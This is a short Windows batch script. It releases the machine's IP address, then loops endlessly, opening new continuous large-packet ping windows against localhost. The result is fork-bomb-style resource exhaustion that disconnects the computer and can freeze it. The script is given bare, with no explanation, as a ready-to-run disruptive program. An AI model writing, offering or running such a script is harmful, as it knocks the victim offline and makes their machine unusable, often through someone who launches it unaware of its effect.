ipconfig /release
:loop
start ping -t -l 65500 127.0.0.1
goto loop
